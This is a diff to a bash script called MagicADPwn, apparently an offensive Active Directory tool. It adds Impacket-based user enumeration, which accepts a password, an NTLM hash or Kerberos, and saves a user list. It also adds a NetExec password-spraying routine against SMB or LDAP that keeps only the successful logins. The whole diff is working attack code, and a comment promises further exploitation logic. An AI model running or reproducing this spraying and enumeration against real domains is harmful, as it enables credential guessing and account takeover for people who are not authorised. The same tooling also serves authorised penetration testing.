@@ -70,6 +70,68 @@ enumerate_computers() {
   eval "$cmd"
 }
 
+# Function to retrieve a list of users from Active Directory
+enumerate_users() {
+  local target="$1"
+  local user="$2"
+  local pass="$3"
+  local hash="$4"
+  local kerberos="$5"
+  
+  echo -e "${GREEN}[INFO]${RESET} Enumerating users on Active Directory..."
+  
+  local cmd="GetADUsers.py -all ${target}"
+  
+  if [[ -n "$user" ]]; then
+    cmd+="/${user}"
+  fi
+  if [[ -n "$pass" ]]; then
+    cmd+=":${pass}"
+  fi
+  if [[ -n "$hash" ]]; then
+    cmd+=" -hashes $hash"
+  fi
+  if [[ "$kerberos" == "true" ]]; then
+    cmd+=" -k"
+  fi
+  
+  echo -e "${GREEN}[INFO]${RESET} Running: $cmd"
+  eval "$cmd" | grep -vE '^(Impacket|\[\*|Name|-------------------)' | awk 'NF {print $1}' | sed '/^$/d' > "$BASE_DIR/users.txt"
+  echo -e "${GREEN}[INFO]${RESET} User list saved to $BASE_DIR/users.txt"
+}
+
+# Function for password spraying
+password_spray() {
+  local target="$1"
+  local users="$2"
+  local passwords="$3"
+  
+  echo -e "${GREEN}[INFO]${RESET} Checking available authentication services on $target..."
+  
+  if check_port "$target" 445; then
+    echo -e "${GREEN}[INFO]${RESET} SMB (port 445) is open. Using SMB for authentication attempts."
+    if [[ -n "$users" && -n "$passwords" ]]; then
+      nxc smb "$target" -u "$users" -p "$passwords" | grep [+]
+    elif [[ -n "$users" ]]; then
+      nxc smb "$target" -u "$users" -p "$PASSWORD" | grep [+]
+    elif [[ -n "$passwords" ]]; then
+      nxc smb "$target" -u "$USERNAME" -p "$passwords" | grep [+]
+    fi
+  elif check_port "$target" 389; then
+    echo -e "${GREEN}[INFO]${RESET} LDAP (port 389) is open. Using LDAP for authentication attempts."
+    if [[ -n "$users" && -n "$passwords" ]]; then
+      nxc ldap "$target" -u "$users" -p "$passwords" | grep [+]
+    elif [[ -n "$users" ]]; then
+      nxc ldap "$target" -u "$users" -p "$PASSWORD" | grep [+]
+    elif [[ -n "$passwords" ]]; then
+      nxc ldap "$target" -u "$USERNAME" -p "$passwords" | grep [+]
+    fi
+  else
+    echo -e "${RED}[ERROR]${RESET} Neither SMB (445) nor LDAP (389) is open on $target. Skipping password spraying."
+    return 1
+  fi
+}
+
 # Ensure arguments are provided
 if [[ "$#" -eq 0 ]]; then
   usage
@@ -161,5 +223,14 @@ echo "Starting MagicADPwn on $TARGET"
 
 # Enumerate computers from Active Directory
 enumerate_computers "$TARGET" "$USERNAME" "$PASSWORD" "$NTLM_HASH" "$KERBEROS"
+
+# Enumerate users from Active Directory
+enumerate_users "$TARGET" "$USERNAME" "$PASSWORD" "$NTLM_HASH" "$KERBEROS"
+
+# Determine authentication mode
+if [[ -n "$SPRAY_USERS" || -n "$SPRAY_PASSWORDS" ]]; then
+  password_spray "$TARGET" "$SPRAY_USERS" "$SPRAY_PASSWORDS"
+  exit 0
+fi
 
 # Additional enumeration and exploitation logic will be added here
